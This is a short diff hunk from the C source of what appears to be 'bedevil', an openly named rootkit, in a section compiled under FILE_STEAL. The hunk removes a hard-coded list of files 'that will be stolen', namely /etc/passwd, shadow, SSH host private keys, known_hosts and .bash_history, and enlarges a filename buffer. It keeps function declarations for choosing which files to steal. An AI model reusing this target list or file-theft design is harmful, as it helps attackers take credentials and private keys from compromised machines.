@@ -16,14 +16,7 @@
 #endif
 
 #ifdef FILE_STEAL
-/* the following array contains files that will be stolen by bedevil.
- * feel free to remove/add files. */
-static char *const interesting_files[15] = {"passwd", "shadow", "sshd_config", "ssh_config", "ssh_host_dsa_key",
-                                            "ssh_host_dsa_key.pub", "ssh_host_ecdsa_key", "ssh_host_ecdsa_key.pub",
-                                            "ssh_host_ed25519_key", "ssh_host_ed25519_key.pub", "ssh_host_rsa_key",
-                                            "ssh_host_rsa_key.pub", "apache.log", "known_hosts", ".bash_history"};
-#define INTERESTING_FILES_SIZE sizeofarr(interesting_files)
-#define FILENAME_MAXLEN 128
+#define FILENAME_MAXLEN 256
 
 int interesting(const char *path);
 char *get_filename(const char *path);
